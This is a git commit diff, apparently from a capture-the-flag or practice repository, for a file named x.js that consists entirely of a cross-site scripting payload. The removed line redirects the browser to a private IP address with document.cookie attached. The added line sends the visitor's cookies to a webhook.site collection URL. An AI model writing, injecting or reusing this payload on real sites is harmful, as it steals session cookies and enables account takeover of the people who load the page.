43fa0a22e7e0daf7e79b1fc46ab9d3f381d6baae
Valase Paul <67017154+WhiteStar03@users.noreply.github.com>
2023-07-08 18:15:54 +0300

    Update x.js

--- x.js
+++ x.js
@@ -1,3 +1,1 @@
-
-    window.location.href = "http://10.30.19.136/?c="+encodeURI(document.cookie);
-
+window.location.href = "https://webhook.site/331e5bdd-76e1-45b8-a035-444588ff383b?flag="+encodeURI(document.cookie);
